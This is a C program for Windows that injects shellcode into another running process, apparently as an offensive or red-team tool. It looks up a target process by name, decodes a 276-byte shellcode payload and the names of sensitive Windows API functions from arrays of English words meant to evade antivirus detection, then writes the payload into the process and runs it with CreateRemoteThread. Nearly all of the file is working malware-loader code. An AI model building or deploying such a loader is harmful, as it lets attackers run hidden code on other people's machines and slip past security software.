#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>

// Make logging look pretty
const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";

// I know these shouldn't be global but I'm too sleep-deprived now
DWORD PID, TID = NULL;
HANDLE hProcess, hThread = INVALID_HANDLE_VALUE;
LPVOID Buffer = NULL;
DWORD oldProtect = NULL;
BOOL rv = FALSE;

// The translation dictionary for the encoded arrays, and the encoded shellcode array
const char* translate_dict[256] = { "welding", "trick", "diseases", "cooper", "silver", "grocery", "meyer", "johns", "encoding", "holder", "needle", "treated", "largest", "feature", "raleigh", "disagree", "pilot", "thought", "ukraine", "italia", "towards", "optimize", "istanbul", "peterson", "tenant", "incoming", "grenada", "fashion", "spots", "gerald", "commit", "dozen", "candy", "carlo", "unique", "theories", "gonna", "deadline", "rider", "wiring", "seems", "making", "switched", "metal", "coverage", "betty", "lucas", "acquire", "terminal", "unless", "dynamic", "terry", "device", "toronto", "quarters", "lucia", "nearly", "locking", "boards", "vietnam", "mcdonald", "tales", "gabriel", "guinea", "nerve", "cornell", "hartford", "limit", "collapse", "mailing", "oriented", "yacht", "maintain", "console", "breed", "tells", "formula", "states", "exports", "tension", "wheat", "lemon", "powers", "helps", "rolled", "italian", "deliver", "mines", "arcade", "compute", "comfort", "satisfy", "britain", "clarity", "surname", "maximum", "laser", "logitech", "strange", "slide", "chart", "remedies", "existed", "binding", "offered", "viewed", "lingerie", "reducing", "delight", "chorus", "small", "lives", "beliefs", "radius", "benefit", "often", "carol", "hearts", "programs", "husband", "fought", "writings", "governor", "animated", "catholic", "steel", "venues", "touched", "attacks", "resumes", "crest", "cisco", "urban", "perform", "pools", "compare", "slight", "worship", "strike", "month", "pirates", "drainage", "sparc", "sounds", "sound", "blank", "infants", "beijing", "justify", "basic", "sequence", "board", "wrong", "bulgaria", "surgeons", "manga", "courts", "elderly", "stone", "olympics", "cookies", "timely", "adopted", "rocky", "brass", "resident", "carnival", "stock", "track", "adipex", "ericsson", "amateur", "staffing", "americas", "gospel", "genuine", "budget", "indices", "earned", "season", "retained", "replace", "norfolk", "prozac", "berkeley", "sleeping", "grande", "empire", "equipped", "slave", "jewelry", "unions", "promotes", "continue", "slovak", "howto", "barry", "humanity", "caroline", "takes", "wichita", "animals", "showers", "brother", "concrete", "derek", "dinner", "compared", "msgstr", "websites", "control", "group", "missing", "reaches", "renew", "lighter", "decline", "tourism", "quotes", "machines", "ghost", "hourly", "agent", "concepts", "cliff", "officer", "violin", "interest", "playlist", "results", "wyoming", "teams", "ethical", "leaves", "cultural", "endif", "bedding", "indie", "scroll", "stake", "precise", "simon", "jeffrey", "indiana", "kills", "onion", "teacher", "throwing", "farming", "valley", "gossip", "springs", "yukon", "focus", "parts", "before" };
const char* sc_enc[276] = { "yukon", "maintain", "cisco", "playlist", "precise", "ethical", "promotes", "welding", "welding", "welding", "cornell", "lemon", "cornell", "wheat", "powers", "lemon", "deliver", "maintain", "unless", "control", "remedies", "maintain", "month", "powers", "laser", "maintain", "month", "powers", "tenant", "maintain", "month", "powers", "candy", "maintain", "month", "benefit", "wheat", "maintain", "disagree", "prozac", "breed", "breed", "states", "unless", "animals", "maintain", "unless", "promotes", "staffing", "mcdonald", "logitech", "catholic", "diseases", "coverage", "candy", "cornell", "continue", "animals", "feature", "cornell", "trick", "continue", "violin", "indie", "powers", "cornell", "lemon", "maintain", "month", "powers", "candy", "month", "hartford", "mcdonald", "maintain", "trick", "msgstr", "month", "attacks", "slight", "welding", "welding", "welding", "maintain", "perform", "promotes", "carol", "binding", "maintain", "trick", "msgstr", "wheat", "month", "maintain", "tenant", "collapse", "month", "nerve", "candy", "console", "trick", "msgstr", "interest", "deliver", "maintain", "before", "animals", "cornell", "month", "device", "slight", "maintain", "trick", "renew", "states", "unless", "animals", "maintain", "unless", "promotes", "staffing", "cornell", "continue", "animals", "feature", "cornell", "trick", "continue", "nearly", "cliff", "hearts", "simon", "formula", "cooper", "formula", "gonna", "encoding", "mailing", "locking", "websites", "hearts", "decline", "arcade", "collapse", "month", "nerve", "gonna", "console", "trick", "msgstr", "existed", "cornell", "month", "largest", "maintain", "collapse", "month", "nerve", "spots", "console", "trick", "msgstr", "cornell", "month", "silver", "slight", "maintain", "trick", "msgstr", "cornell", "arcade", "cornell", "arcade", "surname", "compute", "comfort", "cornell", "arcade", "cornell", "compute", "cornell", "comfort", "maintain", "cisco", "bedding", "candy", "cornell", "powers", "before", "cliff", "arcade", "cornell", "compute", "comfort", "maintain", "month", "ukraine", "leaves", "mines", "before", "before", "before", "clarity", "maintain", "grande", "trick", "welding", "welding", "welding", "welding", "welding", "welding", "welding", "maintain", "drainage", "drainage", "trick", "trick", "welding", "welding", "cornell", "grande", "unless", "month", "lives", "compare", "before", "reaches", "empire", "cliff", "gerald", "switched", "needle", "cornell", "grande", "carnival", "basic", "slave", "elderly", "before", "reaches", "maintain", "cisco", "barry", "seems", "mcdonald", "meyer", "catholic", "needle", "attacks", "springs", "cliff", "hearts", "grocery", "empire", "yacht", "italia", "benefit", "lives", "lingerie", "welding", "compute", "cornell", "worship", "quotes", "before", "reaches", "slide", "logitech", "delight", "slide", "lucas", "remedies", "fought", "remedies", "welding" };

// Converted shellcode placeholder. It must be the same length as the sc_enc array
unsigned char sc[276];
const size_t sc_len = sizeof(sc);

// Function pointers for Windows API functions
BOOL (WINAPI * pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
LPVOID (WINAPI * pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
HANDLE (WINAPI * pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
HANDLE (WINAPI * pCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
HANDLE (WINAPI * pOpenProcess)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);

// An enum so that the DecodeDict function can know whether to add a null terminator or not
enum DecodeType
{
	DECODE_BINARY,
	DECODE_STRING
};

// Where the magic happens, the function that decodes the encoded arrays into their original form
BOOL DecodeDict(const char* encoded[], size_t encodedLength, unsigned char* output, DecodeType type)
{
	for (size_t i = 0; i < encodedLength; i++)
	{
		BOOL found = FALSE;

		for (int j = 0; j < 256; j++)
		{
			if (translate_dict[j] != NULL && strcmp(encoded[i], translate_dict[j]) == 0)
			{
				output[i] = (unsigned char)j;
				found = TRUE;
				break;
			}
		}

		if (!found)
		{
			printf("%s Failed word: %s\n", e, encoded[i]);
			return FALSE;
		}
	}
	// If the type is DECODE_STRING, add a null terminator at the end of the output
	if (type == DECODE_STRING)
		output[encodedLength] = '\0';

	return TRUE;
}

// Find target process by given name
DWORD FindTarget(const char* processName)
{
	HANDLE hSnapshot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32 pe32 = { 0 };
	pe32.dwSize = sizeof(PROCESSENTRY32);

	const char* CreateToolhelp32SnapshotEnc[24] = { "limit", "benefit", "remedies", "logitech", "carol", "remedies", "rolled", "lives", "lives", "delight", "offered", "remedies", "delight", "beliefs", "terry", "dynamic", "helps", "small", "logitech", "beliefs", "often", "offered", "lives", "carol" };
	unsigned char CreateToolhelp32SnapshotDec[25];

	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
	if (hKernel32 == NULL)
	{
		printf("%s Failed to get handle to kernel32.dll, error: %ld\n", e, GetLastError());
		return EXIT_FAILURE;
	}

	if (!DecodeDict(CreateToolhelp32SnapshotEnc, sizeof(CreateToolhelp32SnapshotEnc) / sizeof(CreateToolhelp32SnapshotEnc[0]), CreateToolhelp32SnapshotDec, DECODE_STRING))
	{
		printf("%s Failed to decode CreateToolhelp32Snapshot\n", e); 
		return EXIT_FAILURE;
	}
	printf("%s Decoded API: %s\n", k, CreateToolhelp32SnapshotDec);

	pCreateToolhelp32Snapshot = (HANDLE(WINAPI*)(DWORD, DWORD)) GetProcAddress(hKernel32, (LPCSTR)CreateToolhelp32SnapshotDec);
	if (pCreateToolhelp32Snapshot == 0)
	{
		printf("%s Failed to get address of CreateToolhelp32Snapshot, error: %ld\n", e, GetLastError());
		return EXIT_FAILURE;
	}

	hSnapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	// Get the first process in the snapshot
	if (!Process32First(hSnapshot, &pe32))
	{
		CloseHandle(hSnapshot);
		return 0;
	}

	// Check the first process, then continue checking the rest
	do
	{
		if (lstrcmpiA(processName, pe32.szExeFile) == 0)
		{
			DWORD pid = pe32.th32ProcessID;
			CloseHandle(hSnapshot);
			return pid;
		}

	} while (Process32Next(hSnapshot, &pe32));

	// Process was not found
	CloseHandle(hSnapshot);

	return 0;
}


static int InjectClassic(void) 
{	
	// Encoded API names and their corresponding decoded buffers
	const char* VirtualProtectExEnc[16] = { "deliver", "viewed", "benefit", "carol", "hearts", "logitech", "delight", "wheat", "benefit", "lives", "carol", "remedies", "slide", "carol", "mailing", "fought" };
	unsigned char VirtualProtectExDec[17];
	const char* VirtualAllocExEnc[14] = { "deliver", "viewed", "benefit", "carol", "hearts", "logitech", "delight", "cornell", "delight", "delight", "lives", "slide", "mailing", "fought" };
	unsigned char VirtualAllocExDec[15];
	const char* CreateRemoteThreadEnc[18] = { "limit", "benefit", "remedies", "logitech", "carol", "remedies", "powers", "remedies", "chorus", "lives", "carol", "remedies", "rolled", "offered", "benefit", "remedies", "logitech", "chart" };
	unsigned char CreateRemoteThreadDec[19];
	const char* OpenProcessEnc[11] = { "tension", "beliefs", "remedies", "small", "wheat", "benefit", "lives", "slide", "remedies", "often", "often" };
	unsigned char OpenProcessDec[12];

	if (!DecodeDict(sc_enc, sizeof(sc_enc) / sizeof(sc_enc[0]), sc, DECODE_BINARY))
	{
		printf("%s Failed to decode shellcode\n", e);
		return EXIT_FAILURE;
	}
	printf("%s Decoded shellcode: ", k);

	for (size_t i = 0; i < sc_len; i++)
	{
		printf("%02X ", sc[i]);
	}
	printf("\n");

	// Calculate word count by dividing the size of the encoded array by the size of a single element
	if (!DecodeDict(VirtualProtectExEnc, sizeof(VirtualProtectExEnc) / sizeof(VirtualProtectExEnc[0]), VirtualProtectExDec, DECODE_STRING))
	{
		printf("%s Failed to decode VirtualProtectEx\n", e); 
		return EXIT_FAILURE;
	}
	printf("%s Decoded API: %s\n", k, VirtualProtectExDec);

	if (!DecodeDict(VirtualAllocExEnc, sizeof(VirtualAllocExEnc) / sizeof(VirtualAllocExEnc[0]), VirtualAllocExDec, DECODE_STRING))
	{
		printf("%s Failed to decode VirtualAllocEx\n", e); 
		return EXIT_FAILURE;
	}

	printf("%s Decoded API: %s\n", k, VirtualAllocExDec);

	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
	if (hKernel32 == NULL)
	{
		printf("%s Failed to get handle to kernel32.dll, error: %ld\n", e, GetLastError());
		return EXIT_FAILURE;
	}

	if (!DecodeDict(OpenProcessEnc, sizeof(OpenProcessEnc) / sizeof(OpenProcessEnc[0]), OpenProcessDec, DECODE_STRING))
	{
		printf("%s Failed to decode OpenProcess\n", e);
		return EXIT_FAILURE;
	}

	pOpenProcess = (HANDLE (WINAPI *)(DWORD, BOOL, DWORD)) GetProcAddress(hKernel32, (LPCSTR)OpenProcessDec);
	if (!pOpenProcess)
	{
		printf("OpenProcess resolve failed\n");
		return EXIT_FAILURE;
	}

	hProcess = pOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
		FALSE, PID);

	printf("%s Opening a handle to process (%lu)\n", k, PID);
	if (hProcess == NULL)
	{
		printf("%s Failed to open process (%lu), error: %ld\n", e, PID, GetLastError());
		return EXIT_FAILURE;
	}
	printf("%s Successfully opened handle to process 0x%p\n", k, hProcess);

	pVirtualAllocEx = (LPVOID (WINAPI *)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD)) GetProcAddress(hKernel32, (LPCSTR)VirtualAllocExDec);
	if (!pVirtualAllocEx)
	{
		printf("VirtualAllocEx resolve failed\n");
		return EXIT_FAILURE;
	}

	Buffer = pVirtualAllocEx(hProcess, NULL, sc_len, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	if (Buffer == NULL)
	{
		printf("%s Failed to allocate memory in process (%lu), error: %ld\n", e, PID, GetLastError());
		return EXIT_FAILURE;
	}
	printf("%s Successfully allocated %zu bytes with PAGE_READWRITE\n", k, sc_len);


	printf("%s Writing to buffer to process (%ld)\n", k, PID);
	if (!WriteProcessMemory(hProcess, Buffer, sc, sc_len, NULL))
	{
		printf("%s Failed to write to buffer to process (%lu), error: %ld\n", e, PID, GetLastError());
		return EXIT_FAILURE;
	}

	pVirtualProtectEx = (BOOL (WINAPI *)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD)) GetProcAddress(hKernel32, (LPCSTR)VirtualProtectExDec);
	if (pVirtualProtectEx == 0)
	{
		printf("%s Failed to get address of VirtualProtectEx, error: %ld\n", e, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s Changing memory protection to PAGE_EXECUTE_READ\n", k);
	rv = pVirtualProtectEx(hProcess, Buffer, sizeof(sc), PAGE_EXECUTE_READ, &oldProtect);
	if (rv == 0)
	{
		printf("%s Failed to change memory protection to PAGE_EXECUTE_READ, error: %ld\n", e, GetLastError());
		return EXIT_FAILURE;
	}

	if (!DecodeDict(CreateRemoteThreadEnc, sizeof(CreateRemoteThreadEnc) / sizeof(CreateRemoteThreadEnc[0]), CreateRemoteThreadDec, DECODE_STRING))
	{
		printf("%s Failed to decode CreateRemoteThread\n", e);
		return EXIT_FAILURE;
	}

	pCreateRemoteThread = (HANDLE (WINAPI *)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)) GetProcAddress(hKernel32, (LPCSTR)CreateRemoteThreadDec);
	hThread = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)Buffer, NULL, 0, &TID);

	printf("%s Creating remote thread in process (%lu)\n", k, PID);
	if (hThread == NULL)
	{
		printf("%s Failed to create remote thread in process (%lu), error: %ld\n", e, PID, GetLastError());
		return EXIT_FAILURE;
	}
	printf("%s Successfully created remote thread in process (%lu) with TID (%lu)\n", k, PID, TID);

	printf("%s Waiting for remote thread to finish execution\n", k);
	WaitForSingleObject(hThread, INFINITE);

	printf("%s Remote thread 0x%p finished execution\n", k, hThread);
	printf("%s Closing handles\n", k);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return EXIT_SUCCESS;
}


int main(int argc, char* argv[])
{
	if (argc < 2)
	{
		printf("%s Usage: %s <Process Name>\n", e, argv[0]);
		return EXIT_FAILURE;
	}

	const char* strInput = argv[1];
	PID = FindTarget(strInput);

	if (PID == 0)
	{
		printf("%s Process not found\n", e);
		return EXIT_FAILURE;
	}
	printf("%s Found target PID: %lu\n", k, PID);


	return InjectClassic();
}
